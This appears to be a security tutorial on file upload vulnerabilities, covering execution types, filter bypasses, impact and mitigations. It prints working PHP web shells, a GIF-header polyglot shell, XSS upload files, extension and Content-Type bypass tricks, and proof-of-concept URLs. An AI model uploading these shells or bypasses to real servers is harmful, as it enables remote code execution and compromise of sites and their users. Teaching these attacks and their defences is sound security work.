<p align="center">
  <img src="https://github.com/user-attachments/assets/9864694b-97ff-4314-b0a9-dd3b02e9c7cb" alt="image" width="500"/>
</p>

Many modern websites allow users to upload files:
- Like profile pictures, documents (PDF, DOC), Excel files, or even videos.

But if the developer doesn't enforce **strict control** over the uploaded files' type, name, size, and storage path, an attacker might exploit that and upload a **malicious file**, gaining control over the server or attacking other users.

What we’re going to talk about here is:

> **File Upload Vulnerability**

---

## What is File Upload Vulnerability?

It’s a vulnerability that happens when a website allows users to upload files **without properly verifying**:

* File type (MIME type)
* File extension
* File content
* File size
* File name
* Upload path

And this vulnerability has two main types , we will cover it at the nest section . 

---

## Types of File Upload Vulnerabilities

### 1. With Execution

This is the most dangerous type. The attacker uploads an **executable** file such as:

* `.php`
* `.asp`
* `.jsp`
* `.aspx`

Then they access it directly via URL like:

```
http://example.com/uploads/shell.php
```

that may cause **RCE – Remote Code Execution**.

---

### 2. Without Execution

The website accepts the file but doesn’t execute it. However, the attacker can still:

* Upload an HTML page with a **JavaScript XSS payload**
* Upload a file that contains **malware** and share it with victims
* Use it in **phishing** (fake login pages)
* Store a malicious file and later use it for **LFI or Path Traversal**

---

## How Does it Work?

<p align="center">
  <img src="https://github.com/user-attachments/assets/6b97d1be-5a4d-424b-965a-7a976693d73b" alt="image" width="300"/>
</p>

1. **Attacker prepares a malicious file** (e.g., `shell.php`)
2. Uploads the file via the website's upload form
3. If there’s no proper filtering, the server will accept and save the file
4. Attacker accesses the file through the browser and starts exploiting it

---

## Exploitation Examples

### 1. Uploading a Shell for RCE

```php
<?php system($_GET['cmd']); ?>
```

Save it as `shell.php` and upload it.
Then access:

```
http://target.com/uploads/shell.php?cmd=id
```

You’ll get **output from the server**!

---

### 2. Uploading an XSS File

```html
<script>alert("XSS");</script>
```

Save it as `xss.html` and upload it.
If the server makes it available via direct URL, the attacker can send:

```
http://target.com/uploads/xss.html
```

---

### 3. File Name Obfuscation

You can create a file like:

```
shell.php.jpg
```

Put PHP code inside it. Sometimes the server checks only the extension `.jpg`, so it lets it through.

---

### 4. Fake Image with Embedded PHP

Open a notepad and write:

```
GIF89a
<?php system($_GET['cmd']); ?>
```

Save it as `evil.jpg`. It looks like an image, but it’s a real PHP file. If the server executes any extension, it’ll work as a shell.

---

### 5. Case Sensitivity in Extensions 

Some servers (like Windows/IIS) are **case-insensitive**, so the attacker might bypass filters by using:

```
shell.PHP
shell.PHp
shell.pHp
```

If the server doesn’t normalize extensions to lowercase, it may execute the file anyway.

> Always convert the extension to lowercase on the server-side using code like:

```php
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
```

---

### 6. Alternative Executable Extensions 

Some servers allow execution of other extensions besides `.php`. These are often legacy or obscure PHP extensions, such as:

| Extension | Description                          |
| --------- | ------------------------------------ |
| `.php`    | Standard PHP extension               |
| `.php3`   | Older PHP version                    |
| `.php4`   | Older PHP version                    |
| `.php5`   | Older PHP version                    |
| `.phtml`  | Alternative extension                |
| `.phps`   | Might show source but can be misused |
| `.phar`   | PHP Archive – sometimes executable   |

If the server only blocks `.php`, attackers can try:

```
shell.phtml
shell.php5
```

> Make sure your server is configured to **deny all executable extensions**, not just `.php`.

---

## When Does the Attack Work?

The attack succeeds when the server:

* Executes files from the upload folder (like `/uploads/`)
* Doesn’t validate the content type (MIME type)
* Doesn’t block dangerous extensions
* Keeps the file name as-is

---

## Impact

| Type             | Impact                               |
| ---------------- | ------------------------------------ |
| RCE              | Full control over the server         |
| XSS              | Stealing cookies / user sessions     |
| Defacement       | Modifying the appearance of the site |
| Malware Hosting  | Hosting viruses on the server        |
| Phishing         | Fake pages on the real domain        |
| Information Leak | Accessing sensitive internal files   |

---

## Mitigation Techniques

1. Use a **Whitelist** of allowed file types:

   * Only allow `.jpg`, `.png`, `.pdf`
2. Block **executable extensions**:

   * `.php`, `.exe`, `.js`, `.asp`, etc.
3. Store uploaded files **outside the webroot**.
4. Rename uploaded files (Random file names).
5. Validate both **MIME type** and **File headers**.
6. Prevent files with **double extensions** like:

   * `shell.php.jpg`
7. Sanitize file names from any paths:

   * `../../../etc/passwd`
8. If you’re using PHP, use `.htaccess` like this:

```apache
<FilesMatch "\.(php|php3|phtml)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
```

9. Set a **File Size Limit** to prevent DoS uploads.

---

## POCs - Proof of Concepts

### 1. Shell Upload

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Upload it as `cmd.php` and try:

```
http://site.com/uploads/cmd.php?cmd=whoami
```

---

### 2. XSS HTML File

```html
<script>alert("Hacked")</script>
```

Upload it as `xss.html` and access:

```
http://site.com/uploads/xss.html
```

---

### 3. File with Fake Extension

Name it `shell.php.jpg` and test if the server doesn’t validate the content.

---

## Extra Exploitation Tips

* **Burp Suite**: Use it to intercept the file upload request and change the `Content-Type`.
* **Bypass Content-Type Filtering**:

  * Change `application/x-php` to `image/jpeg`
* **Obfuscate PHP payload**:

  * Use Base64 or:

```php
<?=$_GET[0]?>
```

---
